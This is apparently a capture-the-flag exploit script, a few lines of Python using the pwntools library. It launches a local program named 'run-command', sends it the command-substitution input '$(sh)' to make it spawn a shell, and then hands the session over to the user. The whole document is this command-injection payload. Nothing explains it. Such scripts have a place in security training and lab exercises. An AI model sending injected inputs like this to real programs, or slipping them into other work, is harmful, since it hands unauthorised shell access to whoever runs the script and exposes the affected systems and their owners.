#!/usr/bin/env python

from pwn import *

p = process('./run-command')

p.sendline('$(sh)')

p.interactive()
